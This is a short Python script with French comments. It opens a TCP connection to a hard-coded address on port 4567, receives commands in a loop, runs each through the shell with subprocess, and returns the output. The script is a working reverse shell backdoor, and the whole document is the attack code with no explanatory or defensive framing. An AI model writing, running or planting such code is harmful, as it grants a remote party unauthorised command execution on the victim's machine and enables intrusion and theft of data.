import socket
import os
import sys
import subprocess
import base64

host_name = os.getlogin()

HOST = socket._LOCALHOST  # non-local => changer socket._LOCALHOST en votre ip 
PORT = 4567

filename = "data_socket1.txt"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(("192.168.0.208", PORT)) 


while True:
    data = server.recv(1024).decode("utf-8")

    if len(data) > 0:
        try:
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            out, err = proc.communicate()
            server.send(out)
        except Exception as e:
            print("error", e)
            server.send(f"Client Error : {e}")
            sys.exit()